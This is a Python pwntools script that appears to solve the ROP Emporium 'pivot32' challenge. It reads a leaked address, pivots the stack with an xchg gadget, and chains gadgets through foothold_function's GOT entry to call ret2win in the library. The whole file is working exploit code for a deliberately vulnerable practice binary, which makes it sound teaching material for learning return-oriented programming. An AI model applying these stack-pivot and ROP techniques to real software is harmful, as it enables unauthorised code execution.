from pwn import *
import io
elf = ELF("./pivot32")
lib = ELF("./libpivot32.so")
p = process("./pivot32")

def get_pivot():
    for _ in range(4):
        p.recvline()
    line = p.recvline()
    pivot = p32(int(line[56:64],16))
    return pivot
pivot = get_pivot()

pop_eax = p32(0x0804882c)
pop_ebx = p32(0x080484a9)
xchg_eax_esp = p32(0x0804882e)
mov_eax_dword_eax = p32(0x08048830)
add_eax_ebx = p32(0x08048833)
popal = p32(0x0804874d)
call_eax = p32(0x080485f0)

foothold_function = p32(elf.symbols["plt.foothold_function"])
ret2win = p32(lib.symbols["ret2win"])
foothold_function_got_plt = p32(elf.symbols["got.foothold_function"])

# move stack

rop1 = pop_eax + pivot + xchg_eax_esp

# call ret2win

rop2 = foothold_function
rop2 += pop_eax + foothold_function_got_plt
rop2 += mov_eax_dword_eax
rop2 += pop_ebx + p32(0x974 - 0x77d)
rop2 += add_eax_ebx
rop2 += call_eax

p.recvuntil('> ') 
p.send(rop2)		
p.recvuntil('> ')			   
random = cyclic(44) + rop1
p.send(random)
p.interactive()

